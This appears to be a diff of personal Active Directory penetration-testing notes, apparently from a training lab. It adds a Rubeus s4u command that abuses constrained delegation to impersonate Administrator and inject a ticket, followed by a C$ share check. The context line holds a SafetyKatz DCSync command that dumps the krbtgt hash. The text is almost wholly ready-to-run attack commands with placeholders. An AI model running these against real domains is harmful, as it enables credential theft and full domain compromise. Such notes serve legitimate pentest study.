@@ -30,3 +30,11 @@ C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:<MACHINE>\krbtgt" "exit"
 
 ### **Constrained**
 With the account with the permission's hash launch rubeus to ask a tgt as administrator
+```powerview
+C:\AD\Tools\Rubeus.exe s4u /user:<USER> /aes256:<AES256 HASH> /impersonateuser:Administrator /msdsspn:"<FOUND SERVICE>" /ptt
+```
+Try access the mssql server
+```cmd
+dir \\<MACHINE>\c$
+```
+![[Pasted image 20231106114056.png]]
